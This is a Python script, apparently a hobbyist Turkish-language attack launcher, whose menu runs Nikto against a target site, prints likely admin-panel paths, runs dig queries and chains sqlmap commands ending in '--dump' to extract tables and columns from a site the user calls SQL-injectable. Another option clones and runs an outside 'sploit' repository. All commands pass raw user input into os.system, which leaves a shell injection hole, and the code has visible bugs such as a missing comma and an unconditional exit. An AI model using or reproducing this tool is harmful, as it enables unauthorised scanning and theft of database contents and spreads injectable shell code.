import random
from colorama import Fore, Style
import os
import time
import socket
import requests
import sys

print(Fore.CYAN + "")

def generate_random_banner():
    banners = [
        """
                  888    d8b      888                     888
                  888    Y8P      888                     888
                  888             888                     888
 8888b.  88888b.  888888 888      888888 .d88b.   .d88b.  888
    "88b 888 "88b 888    888      888   d88""88b d88""88b 888
.d888888 888  888 888    888      888   888  888 888  888 888
888  888 888  888 Y88b.  888      Y88b. Y88..88P Y88..88P 888
"Y888888 888  888  "Y888 888       "Y888 "Y88P"   "Y88P"  888

        """,
        """
dBBBBBbbb     dBBBBb  dBBBBBBP dBP dBBBBBBP dBBBBP dBBBBP  dBP
       BB    dBP dBP   dBP    dBP     dB    dBP.BP dBP.BP  dB
   dBP BB   dBP dBP   dBP    dBP      dBP   dBP.BP dBP.BP  dBP
  dBP  BB  dBP dBP   dBP    dBP       dBP   dBP.BP dBP.BP  dBP
 dBBBBBBB dBP dBP   dBP    dBP        dBP   dBBBBP dBBBBP  dBBBBP
        """,
        """
                       /$$     /$$         /$$                         /$$
                      | $$    |__/        | $$                        | $$
  /$$$$$$  /$$$$$$$  /$$$$$$   /$$       /$$$$$$    /$$$$$$   /$$$$$$ | $$
 |____  $$| $$__  $$|_  $$_/  | $$      |_  $$_/   /$$__  $$ /$$__  $$| $$
  /$$$$$$$| $$  \ $$  | $$    | $$        | $$    | $$  \ $$| $$  \ $$| $$
 /$$__  $$| $$  | $$  | $$ /$$| $$        | $$ /$$| $$  | $$| $$  | $$| $$
|  $$$$$$$| $$  | $$  |  $$$$/| $$        |  $$$$/|  $$$$$$/|  $$$$$$/| $$
 \_______/|__/  |__/   \___/  |__/         \___/   \______/  \______/ |__/
        """
    ]

    random_banner = random.choice(banners)
    print(random_banner)

generate_random_banner()
print(Style.RESET_ALL)
print("CODED BY ENESXSEC")
print("-------------------------")
os.system("pip3 install requests")

print(Fore.YELLOW + "")

print("""
[1] NİKTO TARA
[2] ADMİN PANEL KAZIYICI
[3] DNS KAZIYICI
[4] SQL KAZIYICI
[5] SPLOİT
[6] ÇIKIŞ
""")
print(Style.RESET_ALL)


print(Fore.MAGENTA + "")

hedefip = input("Seçenek gir: ")

if hedefip == "1":
    print("""
    ███╗   ██╗██╗██╗  ██╗████████╗ ██████╗
    █████╗ ██║██║██║ ██╔╝╚══██╔══╝██╔═══██╗
    ██╔██╗ ██║██║█████╔╝    ██║   ██║   ██║
    ██║╚██╗██║██║██╔═██╗    ██║   ██║   ██║
    ██║ ╚████║██║██║  ██╗   ██║   ╚██████╔╝
    ╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝
    """)

    hedefip = input("Hedef site gir: ")
    os.system("git clone https://github.com/sullo/nikto")
    os.chdir("nikto/program")
    os.system("perl nikto.pl -h " + hedefip)
    os.system("perl nikto.pl -dbcheck " + hedefip)


print(Fore.GREEN + "")

if hedefip == '2':
    print("""
     e      888~-_        e    e      888 888b    |
    d8b     888   \      d8b  d8b     888 |Y88b   |
   /Y88b    888    |    d888bdY88b    888 | Y88b  |
  /  Y88b   888    |   / Y88Y Y888b   888 |  Y88b |
 /____Y88b  888   /   /   YY   Y888b  888 |   Y88b|
/      Y88b 888_-~   /          Y888b 888 |    Y888
""")
    url = input("Site URL'sini girin (HTTPS/HTTP): ")
    print("Girilen site için aşağıdaki parametreleri deneyin ")
    time.sleep(2)
    print(Fore.RED + "Girilen site: " + url + "/admin")
    time.sleep(2)
    print("Girilen site: " + url + "/login")
    time.sleep(2)
    print("Girilen site: " + url + "/wp-admin")
    time.sleep(2)
    print("Girilen site: " + url + "/cpanel")
    time.sleep(2)
    print("Girilen site: " + url + "/cpanel_login")
    time.sleep(2)
    print("Girilen site: " + url + "/login.php")
    time.sleep(2)
    print("Girilen site: " + url + "/wp-admin.php")
    time.sleep(2)
    print("Girilen site: " + url + "/cpanel.php")
    time.sleep(2)
    print("Girilen site: " + url + "/cpanel_login.php")


    admin_urls = [
        "https://" + url + "/admin",
        "https://" + url + "/login",
        "https://" + url + "/wp-admin",
        "https://" + url + "/cpanel",
        "https://" + url + "/cpanel_login"
        "https://" + url + "/admin.php",
        "https://" + url + "/login.php",
        "https://" + url + "/wp-admin.php",
        "https://" + url + "/cpanel.php",
        "https://" + url + "/cpanel_login.php"

    ]
elif hedefip == '3':
    url = input("Hedef site gir: ")
    print(Fore.CYAN + "")
    print("""
  ;
  ED.
  E#Wi        L.                      .
  E###G.      EW:        ,ft         ;W
  E#fD#W;     E##;       t#E        f#E
  E#t t##L    E###t      t#E      .E#f
  E#t  .E#K,  E#fE#f     t#E     iWW;
  E#t    j##f E#t D#G    t#E    L##Lffi
  E#t    :E#K:E#t  f#E.  t#E   tLLG##L
  E#t   t##L  E#t   t#K: t#E     ,W#i
  E#t .D#W;   E#t    ;#W,t#E    j#E.
  E#tiW#G.    E#t     :K#D#E  .D#j
  E#K##i      E#t      .E##E ,WK,
  E##D.       ..         G#E EG.
  E#t                     fE ,
  L:                       ,
""")
    print(Fore.RED + "")

    os.system("dig " + url)
    time.sleep(2)
    os.system("dig ANY " + url)
    time.sleep(2)
    os.system("dig TTL " + url)
    time.sleep(2)
    os.system("dig +answer -x " + url)
    time.sleep(2)
    os.system("dig +noall +answer " + url)
    time.sleep(2)
    os.system("dig +nssearch " + url)
    time.sleep(2)
    os.system("dig -i " + url)
    time.sleep(2)
    os.system("dig +trace " + url)
    time.sleep(2)
    os.system("dig +short " + url)
    time.sleep(2)
    os.system("dig SOA " + url)
    time.sleep(2)
    print("İşlem tamamlandı.")

elif hedefip == '4':
    print("""


   SSSSSSSSSSSSSSS      QQQQQQQQQ     LLLLLLLLLLL
 SS:::::::::::::::S   QQ:::::::::QQ   L:::::::::L
S:::::SSSSSS::::::S QQ:::::::::::::QQ L:::::::::L
S:::::S     SSSSSSSQ:::::::QQQ:::::::QLL:::::::LL
S:::::S            Q::::::O   Q::::::Q  L:::::L
S:::::S            Q:::::O     Q:::::Q  L:::::L
 S::::SSSS         Q:::::O     Q:::::Q  L:::::L
  SS::::::SSSSS    Q:::::O     Q:::::Q  L:::::L
    SSS::::::::SS  Q:::::O     Q:::::Q  L:::::L
       SSSSSS::::S Q:::::O     Q:::::Q  L:::::L
            S:::::SQ:::::O  QQQQ:::::Q  L:::::L
            S:::::SQ::::::O Q::::::::Q  L:::::L         LLLLLL
SSSSSSS     S:::::SQ:::::::QQ::::::::QLL:::::::LLLLLLLLL:::::L
S::::::SSSSSS:::::S QQ::::::::::::::Q L::::::::::::::::::::::L
S:::::::::::::::SS    QQ:::::::::::Q  L::::::::::::::::::::::L
 SSSSSSSSSSSSSSS        QQQQQQQQ::::QQLLLLLLLLLLLLLLLLLLLLLLLL
                                Q:::::Q
                                 QQQQQQ
    """)

    hedefip = input("SQL açıkılı siteyi tırnak içinde girin: ")
    os.system("git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev")
    os.chdir("sqlmap-dev")
    os.system("python3 sqlmap.py -u " + hedefip + " --dbs")
    db = input("Hangi databaseyi çekeceksiniz seçiniz: ")
    os.system("python3 sqlmap.py -u " + hedefip + " -D " + db + " --tables")
    tb = input("Hangi tablesi çekeceksiniz seçiniz: ")
    os.system("python3 sqlmap.py -u " + hedefip + " -D " + db + " -T " + tb + " --columns")
    cl = input("Hangi columnsu çekeceksiniz seçiniz: ")
    os.system("python3 sqlmap.py -u " + hedefip + " -D " + db + " -T " + tb + " -C " + cl + " --dump")
  

if hedefip == "5":

    os.system("git clone https://github.com/ghost0x02/sploit")
    os.chdir("sploit")
    os.system("python3 sploit.py")


hedefip = "6"
if hedefip == "6":
    sys.exit()
